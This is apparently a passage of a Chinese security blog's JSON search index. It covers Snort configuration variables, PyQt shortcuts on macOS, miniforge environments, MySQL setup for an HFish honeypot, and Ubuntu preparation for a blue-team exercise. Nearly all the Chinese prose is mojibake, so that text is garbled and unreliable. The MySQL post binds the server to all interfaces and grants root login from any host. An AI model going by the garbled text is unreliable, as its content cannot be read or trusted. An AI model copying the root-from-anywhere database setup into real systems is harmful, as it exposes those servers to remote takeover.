$å¼•ç”¨è¯¥å˜é‡ åœ¨å˜é‡ä¸­ä½¿ç”¨å˜é‡å€¼åˆ—è¡¨ï¼Œå®šä¹‰ä¸€ä¸ªåŒ…å«å¤šä¸ªæ¡ç›®çš„å˜é‡ï¼Œä¸åŒçš„æ¡ç›®ç”¨é€—å·åˆ†éš”ã€‚ ä¾‹å¦‚ä¸€ä¸ªåŒ…å«ä¸¤ä¸ªç½‘æ®µçš„ç½‘ç»œ var HOME_NET [192.168.1.0/24,192.168.10.0/24] å®šä¹‰å˜é‡çš„æ—¶å€™ï¼Œå¯ä»¥ç”¨ç½‘ç»œæ¥å£åç§° 1var HOME_NET $ eth0_ADDRESS å®šä¹‰å˜é‡çš„æ—¶å€™ï¼Œå¯ä»¥ç”¨åŠ¨æ€å˜é‡ã€‚å³åœ¨é…ç½®æ–‡ä»¶æˆ–é™„åŠ åŒ…å«æ–‡ä»¶ä¸­ç”¨å·²å®šä¹‰äº†çš„å˜é‡å†å»å®šä¹‰å…¶ä»–å˜é‡ã€‚ ä¾‹å¦‚ï¼Œå®šä¹‰äº†ä¸€ä¸ªå˜é‡DMZ_WEB 1var EXTERNAL_WEB $ DMZ_WEB å…³é”®å­—anyä¹Ÿå¯ä»¥æˆä¸ºä¸€ä¸ªå˜é‡ï¼Œèƒ½åŒ¹é…ä»»ä½•ä¹‹ 1var ECTERNAL_NET any å¦‚æœè¢«å¼•ç”¨çš„å˜é‡æ²¡æœ‰å®šä¹‰æˆ–å®šä¹‰éæ³•ï¼ŒåŠ¨æ€å˜é‡å¯ä»¥è¢«èµ‹äºˆä¸€ä¸ªé»˜è®¤é™æ€åœ°å€ï¼Œä¹Ÿå¯ä»¥å®šä¹‰ä¸€æ®µé”™è¯¯æç¤ºä¿¡æ¯ï¼Œå½“è¢«å¼•ç”¨å˜é‡ä¸ºå®šä¹‰æ—¶å°†æ˜¾ç¤ºè¯¥ä¿¡æ¯ã€‚ 12var &lt;å˜é‡å&gt;$&lt;è¢«å¼•ç”¨å˜é‡ï¼šé»˜è®¤é™æ€åœ°å€&gt;var &lt;å˜é‡å&gt;$&lt;è¢«å¼•ç”¨å˜é‡ï¼š? é”™è¯¯æç¤ºä¿¡æ¯&gt; â€œå˜é‡å€¼â€éƒ¨åˆ†è¢«å†’å·åˆ†å¼€ï¼Œå†’å·å‰é¢æ˜¯è¢«å¼•ç”¨å˜é‡ï¼Œå½“è¢«å¼•ç”¨å˜é‡æœªå®šä¹‰æ—¶ï¼Œå¼•æ“å°†æ ¹æ®å†’å·åé¢çš„éƒ¨åˆ†æ‰§è¡ŒåŠ¨ä½œ ä¾‹å¦‚ï¼šä¸‹é¢çš„è§„åˆ™å®šä¹‰äº†ä¸€ä¸ªåŠ¨æ€çš„å•ä¸€IPåœ°å€ï¼Œå˜é‡DNS_SERVERç­‰äºå˜é‡ORG_DNS_SERVERï¼Œå¦‚æœORGD_DNS_SERVERæ²¡æœ‰å®šä¹‰ï¼ŒDNS_SERVRèµ‹å€¼ä¸º10.1.1.2 1var DNS_SERVER $ (ORG_DNS_SERVER:10.1.1.2) å½“è¢«å¼•ç”¨å˜é‡æœªå®šä¹‰æ—¶ç³»ç»Ÿå°†æ‰“å°é”™è¯¯ä¿¡æ¯ 1var ENTIRE_INTERNAL_COMPANY $ (INTERNAL_NETS:?é”™è¯¯) é…ç½®é¡¹çš„çµæ´»åº”ç”¨ snort.conf æ–‡ä»¶ä¸­ç”¨é…ç½®æŒ‡ä»¤å¯ä»¥è®©ç”¨æˆ·é…ç½®snortçš„å…¨å±€è®¾å®šï¼Œå¦‚æ—¥å¿—æ–‡ä»¶çš„è·¯å¾„ï¼Œè§„åˆ™çš„åº”ç”¨é¡ºåºç­‰ã€‚é…ç½®é¡¹è¯­æ³•æ ¼å¼ç”±é…ç½®å¯¹è±¡çš„æ ‡è¯†å­—æ®µå’Œå‚æ•°å€¼ç»„æˆ 1config&lt;æŒ‡ä»¤å&gt;:&lt;å‚æ•°å€¼&gt; configå˜é‡è¯´æ˜è¯¥é…ç½®é¡¹çš„ç±»å‹ï¼Œâ€œæŒ‡ä»¤åâ€ç”¨æ¥è¯´æ˜å‚æ•°å€¼å°†è¢«åº”ç”¨çš„å¯¹è±¡ã€‚â€œNâ€è¡¨ç¤ºè¯¥æŒ‡ä»¤ä¸éœ€è¦é™„åŠ å‚æ•° é…ç½®æ–‡ä»¶ä¸­çš„å…¶ä»–å…³é”®è¦ç´  é¢„å¤„ç†å™¨é…ç½® 1preprocessor&lt;é¢„å¤„ç†å™¨å&gt;[:&lt;é…ç½®é€‰é¡¹&gt;] è¾“å‡ºæ¨¡å—é…ç½® 1output&lt;è¾“å‡ºæ¨¡å—å&gt;[:&lt;é…ç½®é€‰é¡¹&gt;] è§„åˆ™å’ŒåŒ…æ‹¬æ–‡ä»¶é…ç½® 1includeè§„åˆ™æ–‡ä»¶è·¯å¾„/è§„åˆ™æ–‡ä»¶å å‘½ä»¤è¡Œå‚æ•°1snort[-option]&lt;filter options&gt; -oå‚æ•° snortçš„è§„åˆ™åˆ†ä¸º3å¤§ç±»ï¼ŒæŠ¥è­¦è§„åˆ™ã€é€šè¿‡è§„åˆ™ã€æ—¥å¿—è§„åˆ™ã€‚å½“snrotæ”¶åˆ°åŒ…çš„æ—¶å€™ä¼šæŒ‰ç…§ alert -&gt;pass -&gt; log é¡ºåºä¸€æ¬¡æ£€éªŒï¼Œè¿™æ ·å¯ä»¥ä¿è¯å®‰å…¨æ€§ã€‚ä½†æ˜¯å› ä¸ºå¤§å¤šæ•°åŒ…æ˜¯æ­£å¸¸åŒ…ï¼Œæ‰€ä»¥è¿™æ ·ä¼šè€—è´¹ä¸€äº›ç³»ç»Ÿèµ„æºã€‚ snortæä¾›ä¸€ç§æ–¹æ³•æ”¹å˜é¡ºåºæ¥æé«˜æ•ˆç‡ï¼Œä½†æ˜¯ä¼šé™ä½å®‰å…¨æ€§ã€‚å°†é¡ºåºæ”¹ä¸º pass-&gt;alert-&gt;log","categories":[{"name":"å…¥ä¾µæ£€æµ‹","slug":"å…¥ä¾µæ£€æµ‹","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"},{"name":"snort","slug":"å…¥ä¾µæ£€æµ‹/snort","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/snort/"}],"tags":[{"name":"snort","slug":"snort","permalink":"https://gryffinbit.top/tags/snort/"}],"author":"Gryffinbit"},{"title":"pyQtå¼€å‘ä¸­é‡åˆ°çš„ä¸€äº›å°å‘-macOS M1","slug":"pyQtå¼€å‘ä¸­é‡åˆ°çš„ä¸€äº›å°å‘-macOS-M1","date":"2022-04-13T11:46:17.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2022/04/13/pyQtå¼€å‘ä¸­é‡åˆ°çš„ä¸€äº›å°å‘-macOS-M1/","permalink":"https://gryffinbit.top/2022/04/13/pyQt%E5%BC%80%E5%8F%91%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E5%9D%91-macOS-M1/","excerpt":"","text":"PyQté‡Œé¢keyPressEventçš„ç›¸å…³é—®é¢˜åœ¨macOSç³»ç»Ÿé‡ŒcontrolModifierå¯¹åº”çš„æ˜¯commandï¼ŒMetaModifierå¯¹åº”çš„æ˜¯ctrl 123456class MyLabel(QLabel): def keyPressEvent(self, evt): print(&quot;ç‚¹å‡»äº†é”®ç›˜&quot;) # ç”¨ä»¥æµ‹è¯•è¿™ç§æ–¹æ³•æ˜¯å¦è¢«æ­£å¸¸è°ƒç”¨ # ç»„åˆé”® if evt.modifiers() == Qt.ControlModifier &amp; evt.key() == Qt.Key_W: print(&quot;ç‚¹å‡»äº†command+W é€€å‡ºçª—å£&quot;) ä¸‰ä¸ªç»„åˆé”®ï¼Œä½¿ç”¨æˆ–è¿ç®— 12345if evt.modifiers() == Qt.MetaModifier | Qt.ShiftModifier and evt.key() == Qt.Key_R : print(&quot;ctrl+Shfit+R è¿è¡Œ&quot;)# ä¸¤ä¸ªä¿®é¥°é”®if evt.modifiers() == Qt.MetaModifier | Qt.ShiftModifier: print(&quot;ä¸¤ä¸ªä¿®é¥°é”®ä¸€èµ·è¿è¡Œ&quot;) é”®çš„åç§°commandå¯¹åº”Ctrl Ctrlå¯¹åº”Meta è®¾ç½®å¿«æ·é”®çš„æ—¶å€™æœ‰ç”¨ 1btn.setShortcut(&quot;Meta+a&quot;)","categories":[{"name":"æ‚ä¸ƒæ‚å…«","slug":"æ‚ä¸ƒæ‚å…«","permalink":"https://gryffinbit.top/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"}],"tags":[{"name":"PyQt","slug":"PyQt","permalink":"https://gryffinbit.top/tags/PyQt/"}],"author":"Gryffinbit"},{"title":"miniforgeåˆ›å»ºè™šæ‹Ÿç¯å¢ƒ","slug":"miniforgeåˆ›å»ºè™šæ‹Ÿç¯å¢ƒ","date":"2022-03-31T18:56:29.000Z","updated":"2024-11-12T06:59:26.000Z","comments":true,"path":"2022/04/01/miniforgeåˆ›å»ºè™šæ‹Ÿç¯å¢ƒ/","permalink":"https://gryffinbit.top/2022/04/01/miniforge%E5%88%9B%E5%BB%BA%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/","excerpt":"","text":"å‰è¨€ç”±äºç›®å‰Anacondaæ²¡æœ‰æ”¯æŒarmæ¶æ„çš„ç‰ˆæœ¬ï¼Œåœ¨M1èŠ¯ç‰‡Macä¸Šå®‰è£…çš„Anacondaæ˜¯éå¸¸ä¸ç¨³å®šçš„ï¼Œè€Œä¸”ä»…æ”¯æŒæœ€é«˜3.8ç‰ˆæœ¬çš„Pythonã€‚è€Œå®˜ç½‘åŸç”Ÿæ”¯æŒè¿è¡Œåœ¨armæ¶æ„ä¸Šçš„Pythonç‰ˆæœ¬ä¸º3.9.1ï¼Œæ‰€ä»¥ç»¼åˆæ¥è®²æˆ‘ä»¬åªèƒ½å¯»æ‰¾ä¸€ç§æ›¿ä»£æ–¹æ¡ˆï¼Œé‚£å°±æ˜¯miniforgeã€‚ å®‰è£…miniforge ä¸‹è½½ åœ¨GitHubé¡¹ç›®é‡Œï¼Œæ‰¾åˆ°releaseçš„å®‰è£…è„šæœ¬ï¼Œé€‰æ‹©macOS-arm64.shçš„è„šæœ¬ä¸‹è½½ã€‚ é¡¹ç›®åœ°å€ å®‰è£… 123cd Downloadbash Miniforge3-MacOSX-arm64.shsource ~/.zshrc æ£€æŸ¥æ˜¯å¦å®‰è£…æˆåŠŸ 1conda --version ä¸ºé¡¹ç›®åˆ›å»ºè™šæ‹Ÿç¯å¢ƒ miniforgeåˆ›å»ºçš„è™šæ‹Ÿç¯å¢ƒè·¯å¾„æ˜¯ &#x2F;Users&#x2F;[ç”¨æˆ·å]&#x2F;miniforge3&#x2F;envs 123cd [é¡¹ç›®æ–‡ä»¶å¤¹è·¯å¾„]conda create -n [ä¸ºè™šæ‹Ÿç¯å¢ƒèµ·çš„åå­—] python==3.9conda activate [ä¸ºè™šæ‹Ÿç¯å¢ƒèµ·çš„åå­—] é»˜è®¤ç¯å¢ƒæ˜¯baseï¼Œä½¿ç”¨æŸä¸€ä¸ªè™šæ‹Ÿç¯å¢ƒæ—¶ï¼Œå‰é¢çš„baseä¼šå˜æˆå½“å‰ä½¿ç”¨çš„ç¯å¢ƒåç§° mini forgeçš„è™šæ‹Ÿç¯å¢ƒå¯ä»¥éš”ç¦»ï¼Œä¸ºè¯¥è™šæ‹Ÿç¯å¢ƒä¸‹è½½éœ€è¦çš„å®‰è£…åŒ…æ—¶ï¼Œå»ºè®®ä½¿ç”¨conda install ä¸‹è½½ å¦‚æœä¸èƒ½å®‰è£…çš„è¯ï¼Œä¹Ÿå¯ä»¥é€‰ç”¨pip install ï¼Œæ•ˆæœå·®ä¸å¤šã€‚ è¿™ç¯‡æ–‡ç« æœ‰è¯¦ç»†ä»‹ç»ä¸¤ç§å®‰è£…æ–¹å¼çš„å·®åˆ« https://www.cnblogs.com/Li-JT/p/14024034.html pyqt5 é¡¹ç›®éƒ¨ç½²1234conda activate TQHoneypip3 install pyqt5pip3 install pyqt5-toolspip3 install sip æ›´æ¢æºçš„è¯ä¼šæ›´å¿« 1pip install -i https://pypi.tuna.tsinghua.edu.cn/simple pyqt5-tools æ¸…åï¼šhttps://pypi.tuna.tsinghua.edu.cn/simpleé˜¿é‡Œäº‘ï¼šhttp://mirrors.aliyun.com/pypi/simple/ä¸­å›½ç§‘æŠ€å¤§å­¦ https://pypi.mirrors.ustc.edu.cn/simple/åä¸­ç†å·¥å¤§å­¦ï¼šhttp://pypi.hustunique.com/å±±ä¸œç†å·¥å¤§å­¦ï¼šhttp://pypi.sdutlinux.org/è±†ç“£ï¼šhttp://pypi.douban.com/simple/noteï¼šæ–°ç‰ˆubuntuè¦æ±‚ä½¿ç”¨httpsæºï¼Œè¦æ³¨æ„ã€‚ é…ç½®pycharmPreferenceé€‰æ‹©è§£é‡Šå™¨è·¯å¾„ã€‚ï¼ˆå¯ä»¥ç›´æ¥pycharmæ‰“å¼€æ–‡ä»¶å¤¹ï¼Œé€‰æ‹©åˆšåˆšé…ç½®å¥½ç¯å¢ƒçš„é‚£ä¸ªæ–‡ä»¶å¤¹ï¼Œå°±ä¼šè‡ªåŠ¨å¯¼å…¥è§£é‡Šå™¨çš„è·¯å¾„äº†ï¼‰ é…ç½®GitHubé¡¹ç›®åŒæ­¥ä¸Šä¼ è‡³GitHub é€šè¿‡è®¤è¯ é¦–å…ˆåœ¨æœ¬åœ°ç”Ÿæˆkey 1ssh-keygen æ‰“å¼€GitHubã€‚settingé‡Œé¢æ·»åŠ ssh åå­—éšä¾¿å–ï¼Œ å°†åˆšåˆšç”Ÿæˆçš„ï½/.ssh/id_rsa.pubç²˜è´´è¿›å»å³å¯ã€‚ å‚è€ƒæ–‡ç« pycharmé‡Œé¢githubç™»å½•æ€»æ˜¯æ˜¾ç¤ºmissing access token gitä¸Šä¼ æŠ¥é”™ LibreSSL SSL_connect: SSL_ERROR_SYSCALL in connection to github.com:443 æŠ¥é”™","categories":[{"name":"åˆ›æ„å¼€å‘","slug":"åˆ›æ„å¼€å‘","permalink":"https://gryffinbit.top/categories/%E5%88%9B%E6%84%8F%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"conda","slug":"conda","permalink":"https://gryffinbit.top/tags/conda/"}],"author":"Gryffinbit"},{"title":"ubuntuå®‰è£…é…ç½®mysqlï¼ˆHfishæ•°æ®åº“ï¼‰","slug":"ubuntuå®‰è£…é…ç½®mysql","date":"2022-03-26T23:18:07.000Z","updated":"2024-11-12T06:59:10.000Z","comments":true,"path":"2022/03/27/ubuntuå®‰è£…é…ç½®mysql/","permalink":"https://gryffinbit.top/2022/03/27/ubuntu%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AEmysql/","excerpt":"","text":"ubuntuäº‘æœåŠ¡çš„å…¶ä»–è¯¦ç»†é…ç½®è§å¦ä¸€ä¸ªblogç¯å¢ƒé…ç½® ubuntuå®‰è£…é…ç½®mysqlå®‰è£…mysql å®‰è£…æœåŠ¡ 12345678910# å®‰è£…æœåŠ¡sudo apt update apt install mysql-client-core-8.0 # version 8.0.28-0ubuntu0.20.04.3 sudo apt-get install mysql-server# å¼€å¯æœåŠ¡service mysql start# æŸ¥è¯¢æ˜¯å¦å¼€å¯æˆåŠŸsudo netstat -tap | grep mysql 1sudo apt update 1apt install mysql-client-core-8.0 # version 8.0.28-0ubuntu0.20.04.3 1sudo apt-get install mysql-server å¼€å¯æœåŠ¡ 1service mysql start æŸ¥è¯¢æ˜¯å¦å¼€å¯æˆåŠŸ 1sudo netstat -tap | grep mysql é…ç½®mysql ç™»é™† 1mysql -u root ä¿®æ”¹å¯†ç  1sudo cat /etc/mysql/debian.cnf ç”¨æ˜¾ç¤ºçš„ç”¨æˆ·å¯†ç ç™»é™† 1ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED WITH mysql_native_password BY &#x27;[è¾“å…¥æ–°å¯†ç ]&#x27;; åˆ›å»ºèœœç½çš„Hfishæ•°æ®åº“ æŠŠåˆ›å»ºæ•°æ®åº“çš„mysqlè„šæœ¬ä¸Šä¼ åˆ°äº‘å¯¹è±¡å­˜å‚¨ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263-- ------------------------------ Table structure for `hfish_info`-- ----------------------------DROP TABLE IF EXISTS `hfish_info`;CREATE TABLE `hfish_info` ( `id` int(11) NOT NULL AUTO_INCREMENT, `type` varchar(20) NOT NULL DEFAULT &#x27;&#x27;, `project_name` varchar(20) NOT NULL DEFAULT &#x27;&#x27;, `agent` varchar(20) NOT NULL DEFAULT &#x27;&#x27;, `ip` varchar(20) NOT NULL DEFAULT &#x27;&#x27;, `country` varchar(10) NOT NULL DEFAULT &#x27;&#x27;, `region` varchar(10) NOT NULL DEFAULT &#x27;&#x27;, `city` varchar(10) NOT NULL, `info` text NOT NULL, `create_time` datetime NOT NULL, PRIMARY KEY (`id`)) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8mb4;SET FOREIGN_KEY_CHECKS = 1;-- ------------------------------ Table structure for `hfish_colony`-- ----------------------------DROP TABLE IF EXISTS `hfish_colony`;CREATE TABLE `hfish_colony` ( `id` int(11) NOT NULL AUTO_INCREMENT, `agent_name` varchar(20) NOT NULL DEFAULT &#x27;&#x27;, `agent_ip` varchar(20) NOT NULL DEFAULT &#x27;&#x27;, `web_status` int(2) NOT NULL DEFAULT &#x27;0&#x27;, `deep_status` int(2) NOT NULL DEFAULT &#x27;0&#x27;, `ssh_status` int(2) NOT NULL DEFAULT &#x27;0&#x27;, `redis_status` int(2) NOT NULL DEFAULT &#x27;0&#x27;, `mysql_status` int(2) NOT NULL DEFAULT &#x27;0&#x27;, `http_status` int(2) NOT NULL DEFAULT &#x27;0&#x27;, `telnet_status` int(2) NOT NULL DEFAULT &#x27;0&#x27;, `ftp_status` int(2) NOT NULL DEFAULT &#x27;0&#x27;, `mem_cache_status` int(2) NOT NULL DEFAULT &#x27;0&#x27;, `plug_status` int(2) NOT NULL DEFAULT &#x27;0&#x27;, `last_update_time` datetime NOT NULL, PRIMARY KEY (`id`), UNIQUE KEY `un_agent` (`agent_name`) USING BTREE) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8mb4;SET FOREIGN_KEY_CHECKS = 1;-- ------------------------------ Table structure for `hfish_setting`-- ----------------------------DROP TABLE IF EXISTS `hfish_setting`;CREATE TABLE `hfish_setting` ( `id` int(11) NOT NULL AUTO_INCREMENT, `type` varchar(50) NOT NULL DEFAULT &#x27;&#x27;, `info` varchar(50) NOT NULL DEFAULT &#x27;&#x27;, `update_time` datetime NOT NULL, `status` int(2) NOT NULL DEFAULT &#x27;0&#x27;, `setting_name` varchar(50) NOT NULL DEFAULT &#x27;&#x27;, `setting_dis` varchar(50) NOT NULL DEFAULT &#x27;&#x27;, PRIMARY KEY (`id`), UNIQUE KEY `index_key` (`type`)) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8mb4;-- ------------------------------ Records of `hfish_setting`-- ----------------------------BEGIN;INSERT INTO `hfish_setting` VALUES (&#x27;1&#x27;, &#x27;mail&#x27;, &#x27;&#x27;, &#x27;2019-09-02 20:15:00&#x27;, &#x27;0&#x27;, &#x27;E-mail ç¾¤å‘&#x27;, &#x27;ç¾¤å‘é‚®ä»¶SMTPæœåŠ¡å™¨é…ç½®&#x27;), (&#x27;2&#x27;, &#x27;alertMail&#x27;, &#x27;&#x27;, &#x27;2019-09-02 18:58:12&#x27;, &#x27;0&#x27;, &#x27;E-mail é€šçŸ¥&#x27;, &#x27;èœœç½å‘Šè­¦ä¼šé€šè¿‡é‚®ä»¶å‘ŠçŸ¥ä¿¡æ¯&#x27;), (&#x27;3&#x27;, &#x27;webHook&#x27;, &#x27;&#x27;, &#x27;2019-09-03 11:49:00&#x27;, &#x27;0&#x27;, &#x27;WebHook é€šçŸ¥&#x27;, &#x27;èœœç½å‘Šè­¦ä¼šè¯·æ±‚æŒ‡å®šAPIå‘ŠçŸ¥ä¿¡æ¯&#x27;), (&#x27;4&#x27;, &#x27;whiteIp&#x27;, &#x27;&#x27;, &#x27;2019-09-02 20:15:00&#x27;, &#x27;0&#x27;, &#x27;IP ç™½åå•&#x27;, &#x27;èœœç½ä¸Šé’©ä¼šè¿‡æ»¤æ‰ç™½åå•IP&#x27;);COMMIT;SET FOREIGN_KEY_CHECKS = 1; äº‘æœåŠ¡å™¨ä¸‹è½½sqlè„šæœ¬ 1curl -o hfish.sql &quot;https://appendix-1310394682.cos.ap-beijing.myqcloud.com/script/hfish.sql&quot; åˆ›å»ºæ•°æ®åº“ 1create database hfish default charset=utf8; ä½¿ç”¨è¯¥æ•°æ®åº“ 1use hfish å¯¼å…¥mysql 1source /home/ubuntu/hfish.sql æŸ¥çœ‹æ•°æ®åº“å†…å®¹ 12show tables; #æŸ¥çœ‹è¡¨desc [è¡¨å]; # æŸ¥çœ‹è¡¨å…·ä½“ä¿¡æ¯ï¼Œåˆ— å…è®¸å¤–ç½‘è®¿é—® ä¿®æ”¹äº‘æœåŠ¡å™¨ä¸Šmysqlé…ç½®æ–‡ä»¶ 12cd /etc/mysqlvim mysql.cnf æ·»åŠ è¿™ä¸€è¡Œ 1234[mysqld]bind-address = 0.0.0.0 # è¦ç©ºä¸€è¡Œ æ£€æŸ¥ç›‘å¬ç«¯å£ 1netstat -nutlp | grep mysql è®¾ç½®mysqlçš„æƒé™ è¿›å…¥mysqlï¼š 1mysql -uroot -p è¾“å…¥å¯†ç ã€‚ é€‰æ‹©mysqlæ•°æ®åº“ï¼š 1use mysql; å¢åŠ å…è®¸è¿œç¨‹è®¿é—®çš„ç”¨æˆ·æˆ–è€…å…è®¸ç°æœ‰ç”¨æˆ·çš„è¿œç¨‹è®¿é—®ã€‚ ç»™rootæˆäºˆåœ¨ä»»æ„ä¸»æœºï¼ˆ%ï¼‰è®¿é—®ä»»æ„æ•°æ®åº“çš„æ‰€æœ‰æƒé™ã€‚ 1update user set host=&#x27;%&#x27; where user=&#x27;root&#x27; and host=&#x27;localhost&#x27;; é€€å‡ºmysqlï¼š 1exit é‡å¯æ•°æ®åº“ï¼š 1sudo service mysql restart è¿æ¥æˆåŠŸ","categories":[{"name":"æ‚ä¸ƒæ‚å…«","slug":"æ‚ä¸ƒæ‚å…«","permalink":"https://gryffinbit.top/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"}],"tags":[{"name":"mysql","slug":"mysql","permalink":"https://gryffinbit.top/tags/mysql/"},{"name":"ubuntu","slug":"ubuntu","permalink":"https://gryffinbit.top/tags/ubuntu/"}],"author":"Gryffinbit"},{"title":"æ¨¡æ‹Ÿæ”»é˜²æ¼”ç»ƒä¸­ç¯‡ï¼Œè“æ–¹é¶åœºéƒ¨ç½²","slug":"æ¨¡æ‹Ÿæ”»é˜²æ¼”ç»ƒä¸­ç¯‡ï¼Œè“æ–¹é¶åœºéƒ¨ç½²","date":"2022-03-24T13:45:39.000Z","updated":"2024-11-12T07:00:09.000Z","comments":true,"path":"2022/03/24/æ¨¡æ‹Ÿæ”»é˜²æ¼”ç»ƒä¸­ç¯‡ï¼Œè“æ–¹é¶åœºéƒ¨ç½²/","permalink":"https://gryffinbit.top/2022/03/24/%E6%A8%A1%E6%8B%9F%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%AD%E7%AF%87%EF%BC%8C%E8%93%9D%E6%96%B9%E9%9D%B6%E5%9C%BA%E9%83%A8%E7%BD%B2/","excerpt":"","text":"å‰è¨€è®°å½•ä¸€æ¬¡å…¥ä¾µæ£€æµ‹&#x2F;åº”æ€¥å“åº”çš„å®æˆ˜æ”»å‡»ã€‚ å®æˆ˜æ€è·¯ï¼š åœ¨äº‘æœåŠ¡å™¨ï¼ˆUbuntu Server 20.04 LTS 64bitï¼‰ä¸Šè£…dockerï¼Œdockeré¶åœºé€‰æ‹©vulhubï¼Œçº¢æ–¹æ”»å‡»é¶æœºï¼Œè“æ–¹åœ¨dockerå†…çš„é¶åœºç¯å¢ƒé‡Œè¿›è¡Œæº¯æºå’Œå…¥ä¾µæ£€æµ‹ç­‰ä¸€ç³»åˆ—é˜²å®ˆå·¥ä½œã€‚æœŸé—´è“é˜Ÿé˜²å®ˆï¼Œä¼šç”¨èœœç½æ¥è¿·æƒ‘å’Œæ£€æµ‹æ”»å‡»ã€‚èœœç½é€‰ç”¨Hfishï¼Œåœ¨æœ¬åœ°çš„ç‰©ç†æœºæ­å»ºï¼Œä½œä¸ºç®¡ç†ç«¯ï¼Œä¸ºdockeré¶æœºåˆ†é…å­èŠ‚ç‚¹ï¼Œä»¥æ­¤æ¥å¯¹dockeré¶æœºè¿›è¡Œèœœç½éƒ¨ç½²ã€‚ æ„Ÿè°¢ @Gryffinrab çš„çº¢æ–¹æ”»å‡»å‹æƒ…å‡ºæ¼” Hfishé¶åœºæ­å»ºå‚è€ƒä»¥å‰çš„blogã€‚ä¸Šæ¬¡çš„Blogä¼ é€é—¨Hfishèœœç½éƒ¨ç½² ubuntu åŸºæœ¬é…ç½®è®¾ç½®SSHè¿æ¥æ—¶é•¿ æ‰“å¼€äº‘æœåŠ¡å™¨sshé…ç½®æ–‡ä»¶ï¼š 1vim /etc/ssh/sshd_config åŠ å…¥å¦‚ä¸‹ä¸¤ä¸ªå‚æ•°ä¿å­˜å°±å¯ä»¥ï¼š 1234TCPKeepAlive yes # ä¿æŒTCPè¿æ¥ClientAliveInterval 600 ClientAliveCountMax 10 é‡å¯sshæœåŠ¡ 1service sshd restart åœ¨å®¢æˆ·ç«¯æœ¬åœ°é…ç½® åœ¨~./ssh/configé‡Œæ·»åŠ  1234# æ–­å¼€æ—¶é‡è¯•è¿æ¥çš„æ¬¡æ•° ServerAliveCountMax 5 # æ¯éš”10ç§’è‡ªåŠ¨å‘é€ä¸€ä¸ªç©ºçš„è¯·æ±‚ä»¥ä¿æŒè¿æ¥ ServerAliveInterval 10 æ¢æºæˆ‘è¿™é‡Œé˜¿é‡Œæºæ¯”è…¾è®¯è‡ªå·±çš„æºè¦å¿«ä¸€äº› 1sudo vim /etc/apt/sources.list æŠŠæœ¬æ¥çš„è…¾è®¯æºæ³¨é‡Šæ‰ï¼Œæ¢æˆé˜¿é‡Œæº 12345678910111213141516171819deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse focal æ›´æ–°æº 1sudo apt-get update æ›´æ–°è½¯ä»¶ 1sudo apt-get upgrade è£…oh-my-zshå®‰è£…git 1sudo apt install git -y æŸ¥çœ‹ç³»ç»Ÿå½“å‰shell 1echo $SHELL æŸ¥çœ‹ç³»ç»Ÿè‡ªå¸¦å“ªäº›shell 1cat /etc/shells å®‰è£…zsh 1sudo apt install zsh -y å®‰è£…ä¹‹å ä½¿ç”¨ cat /etc/shells æŸ¥çœ‹ç³»ç»Ÿçš„shellæœ‰ /usr/bin/zshè¯´æ˜å®‰è£…æˆåŠŸã€‚ è®¾ç½®zshä¸ºé»˜è®¤shell 1chsh -s /bin/zsh ç„¶åé‡å¯ 1sudo reboot å®‰è£…oh-my-zsh 1sh -c &quot;$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)&quot; é…ç½®æ–‡ä»¶ 1vi ~/.zshrc ä¿®æ”¹ä¸»é¢˜ ä¿®æ”¹è¿™ä¸€è¡ŒZSH_THEME=&quot;robbyrussell&quot;å°†ä¸»é¢˜ä¿®æ”¹ä¸ºè‡ªå·±å–œæ¬¢çš„ é‡æ–°åŠ è½½é…ç½®æ–‡ä»¶ 1source ~/.zshrc ä¸‹è½½æ’ä»¶ è‡ªåŠ¨æç¤º 1git clone https://github.com/zsh-users/zsh-autosuggestions $ZSH_CUSTOM/plugins/zsh-autosuggestions è¯­æ³•é«˜äº® 1sudo apt install zsh-syntax-highlighting 1echo &quot;source /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh&quot; &gt;&gt; ~/.zshrc ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œç”Ÿæ•ˆæ’ä»¶ 1vim ~/.zshrc æ‰¾åˆ°æ’ä»¶ä½ç½®ï¼Œæ·»åŠ åˆšåˆšçš„æ’ä»¶ 1source ~/.zshrc PSï¼šå¦‚æœé‡æ–°æ‰“å¼€ç»ˆç«¯çœ‹ä¸åˆ°è‡ªåŠ¨æç¤ºï¼Œå¯èƒ½æ˜¯ç»ˆç«¯çš„å­—ä½“é¢œè‰²å¤ªæ·¡äº†ï¼Œå¯ä»¥é€šè¿‡ğŸ‘‡é…ç½®æŠŠå­—ä½“æ”¹äº®ä¸€äº›ï¼š 1cd ~/.oh-my-zsh/custom/plugins/zsh-autosuggestions 